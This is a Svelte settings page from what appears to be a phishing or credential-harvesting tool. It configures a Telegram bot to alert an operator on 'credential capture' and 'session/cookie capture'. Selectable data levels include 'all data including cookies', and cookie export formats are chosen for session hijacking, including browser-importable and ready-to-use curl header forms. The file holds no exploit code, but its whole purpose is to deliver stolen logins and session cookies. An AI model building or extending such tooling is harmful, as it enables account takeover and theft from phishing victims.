<script>
	import { api } from '$lib/api/apiProxy.js';
	import Headline from '$lib/components/Headline.svelte';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import { hideIsLoading, showIsLoading } from '$lib/store/loading';
	import { addToast } from '$lib/store/toast';
	import { onMount } from 'svelte';

	let isLoaded = false;
	let formError = '';
	let isSubmitting = false;
	let isTesting = false;
	let viewToken = true;

	let formValues = {
		enabled: false,
		botToken: '',
		chatID: '',
		notifyOnCapture: true,
		notifyOnSession: true,
		dataLevel: 'standard',
		cookieFormat: 'netscape'
	};

	const dataLevels = [
		{ value: 'minimal', label: 'Minimal - IP and timestamp only' },
		{ value: 'standard', label: 'Standard - IP, UA, country, captured fields' },
		{ value: 'full', label: 'Full - All data including cookies' }
	];

	const cookieFormats = [
		{ value: 'netscape', label: 'Netscape - Browser-importable text format' },
		{ value: 'json', label: 'JSON - Structured array format' },
		{ value: 'header', label: 'Header - Cookie header string (name=value pairs)' }
	];

	onMount(async () => {
		showIsLoading();
		try {
			const res = await api.telegram.getSettings();
			if (res.success && res.data) {
				formValues = { ...formValues, ...res.data };
			}
		} catch (e) {
			// first time - no settings yet
		}
		isLoaded = true;
		hideIsLoading();
	});

	const onSubmit = async () => {
		formError = '';
		isSubmitting = true;
		try {
			const res = await api.telegram.saveSettings(formValues);
			if (res.success) {
				addToast('Telegram settings saved', 'Success');
			} else {
				formError = res.error || 'Failed to save settings';
			}
		} catch (e) {
			formError = 'An error occurred while saving settings';
		}
		isSubmitting = false;
	};

	const onTest = async () => {
		isTesting = true;
		try {
			const res = await api.telegram.test(formValues);
			if (res.success) {
				addToast('Test message sent to Telegram', 'Success');
			} else {
				addToast(res.error || 'Failed to send test message', 'Error');
			}
		} catch (e) {
			addToast('Failed to send test message', 'Error');
		}
		isTesting = false;
	};

	const toggleTokenView = (e) => {
		e.preventDefault();
		viewToken = !viewToken;
	};
</script>

<HeadTitle title="Telegram Notifications" />

{#if isLoaded}
	<Headline title="Telegram Notifications" subtitle="Configure real-time Telegram alerts for captured credentials and session completions." />

	<div class="max-w-4xl mx-auto px-4 sm:px-6 py-6">
		<form on:submit|preventDefault={onSubmit} class="space-y-6 bg-white dark:bg-gray-800 rounded-lg p-6 shadow-sm border border-gray-200 dark:border-gray-700 transition-colors duration-200">

			<!-- Enable Toggle -->
			<div class="flex items-center gap-3">
				<label class="relative inline-flex items-center cursor-pointer">
					<input type="checkbox" bind:checked={formValues.enabled} class="sr-only peer" />
					<div class="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 dark:peer-focus:ring-blue-800 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-blue-600"></div>
					<span class="ml-3 text-sm font-medium text-gray-900 dark:text-gray-300">Enable Telegram Notifications</span>
				</label>
			</div>

			<!-- Bot Token & Chat ID -->
			<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
				<div class="flex flex-col">
					<label class="font-semibold text-slate-600 dark:text-gray-400 py-2 transition-colors duration-200">Bot Token</label>
					<div class="relative flex items-center">
						{#if viewToken}
							<input
								type="password"
								bind:value={formValues.botToken}
								placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
								autocomplete="off"
								class="w-full text-ellipsis rounded-md py-2 pl-4 pr-12 text-gray-600 dark:text-gray-300 border border-transparent dark:border-gray-700/60 focus:outline-none focus:border-solid focus:border-slate-400 dark:focus:border-highlight-blue/80 focus:bg-gray-100 dark:focus:bg-gray-700/60 bg-grayblue-light dark:bg-gray-900/60 font-normal transition-colors duration-200"
							/>
						{:else}
							<input
								type="text"
								bind:value={formValues.botToken}
								placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
								autocomplete="off"
								class="w-full text-ellipsis rounded-md py-2 pl-4 pr-12 text-gray-600 dark:text-gray-300 border border-transparent dark:border-gray-700/60 focus:outline-none focus:border-solid focus:border-slate-400 dark:focus:border-highlight-blue/80 focus:bg-gray-100 dark:focus:bg-gray-700/60 bg-grayblue-light dark:bg-gray-900/60 font-normal transition-colors duration-200"
							/>
						{/if}
						<button class="absolute right-2 w-8 hover:opacity-70 transition-opacity duration-200" on:click={toggleTokenView}>
							{#if viewToken}
								<img src="/view.svg" alt="view" class="dark:filter dark:brightness-0 dark:invert transition-all duration-200" />
							{:else}
								<img src="/toggle-view.svg" alt="toggle view" class="dark:filter dark:brightness-0 dark:invert transition-all duration-200" />
							{/if}
						</button>
					</div>
					<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Create a bot via @BotFather on Telegram to get a token.</p>
				</div>
				<div class="flex flex-col">
					<label class="font-semibold text-slate-600 dark:text-gray-400 py-2 transition-colors duration-200">Chat ID</label>
					<input
						type="text"
						bind:value={formValues.chatID}
						placeholder="-1001234567890"
						autocomplete="off"
						class="w-full text-ellipsis rounded-md py-2 pl-4 text-gray-600 dark:text-gray-300 border border-transparent dark:border-gray-700/60 focus:outline-none focus:border-solid focus:border-slate-400 dark:focus:border-highlight-blue/80 focus:bg-gray-100 dark:focus:bg-gray-700/60 bg-grayblue-light dark:bg-gray-900/60 font-normal transition-colors duration-200"
					/>
					<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">The Telegram chat/group/channel ID to receive notifications.</p>
				</div>
			</div>

			<!-- Notification Options & Data Level -->
			<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
				<div class="space-y-3">
					<label class="font-semibold text-slate-600 dark:text-gray-400 transition-colors duration-200">Notification Events</label>
					<label class="flex items-center gap-2">
						<input type="checkbox" bind:checked={formValues.notifyOnCapture} class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" />
						<span class="text-sm text-gray-700 dark:text-gray-300">Notify on credential capture</span>
					</label>
					<label class="flex items-center gap-2">
						<input type="checkbox" bind:checked={formValues.notifyOnSession} class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" />
						<span class="text-sm text-gray-700 dark:text-gray-300">Notify on session/cookie capture</span>
					</label>
				</div>
				<div class="flex flex-col">
					<label class="font-semibold text-slate-600 dark:text-gray-400 py-2 transition-colors duration-200">Data Level</label>
					<select bind:value={formValues.dataLevel} class="w-full rounded-md border border-gray-300 dark:border-gray-600 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:text-white py-2 px-3 text-sm">
						{#each dataLevels as level}
							<option value={level.value}>{level.label}</option>
						{/each}
					</select>
					<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Controls how much data is included in each notification.</p>
				</div>
			</div>

			<!-- Cookie Format (shown when data level is 'full') -->
			{#if formValues.dataLevel === 'full'}
				<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
					<div class="flex flex-col">
						<label class="font-semibold text-slate-600 dark:text-gray-400 py-2 transition-colors duration-200">Cookie Format</label>
						<select bind:value={formValues.cookieFormat} class="w-full rounded-md border border-gray-300 dark:border-gray-600 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:text-white py-2 px-3 text-sm">
							{#each cookieFormats as fmt}
								<option value={fmt.value}>{fmt.label}</option>
							{/each}
						</select>
						<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Format for cookies included in Telegram notifications.</p>
					</div>
					<div class="flex flex-col justify-end pb-1">
						<div class="text-xs text-gray-500 dark:text-gray-400 space-y-1">
							<p><strong>Netscape:</strong> Compatible with browser cookie import extensions (EditThisCookie, Cookie-Editor)</p>
							<p><strong>JSON:</strong> Structured format for programmatic use and Chrome DevTools import</p>
							<p><strong>Header:</strong> Ready-to-use Cookie header string for curl/HTTP requests</p>
						</div>
					</div>
				</div>
			{/if}

			<!-- Error -->
			{#if formError}
				<div class="text-red-500 dark:text-red-400 text-sm">{formError}</div>
			{/if}

			<!-- Actions -->
			<div class="flex flex-wrap gap-3 pt-4 border-t border-gray-200 dark:border-gray-700">
				<button
					type="submit"
					disabled={isSubmitting}
					class="px-6 py-2 bg-pc-darkblue dark:bg-highlight-blue text-white rounded-md hover:opacity-90 transition-opacity duration-200 disabled:opacity-50 font-medium text-sm uppercase"
				>
					{isSubmitting ? 'Saving...' : 'Save Settings'}
				</button>
				<button
					type="button"
					on:click={onTest}
					disabled={isTesting || !formValues.botToken || !formValues.chatID}
					class="px-6 py-2 bg-gray-500 text-white rounded-md hover:opacity-90 transition-opacity duration-200 disabled:opacity-50 font-medium text-sm uppercase"
				>
					{isTesting ? 'Sending...' : 'Send Test Message'}
				</button>
			</div>
		</form>
	</div>
{/if}
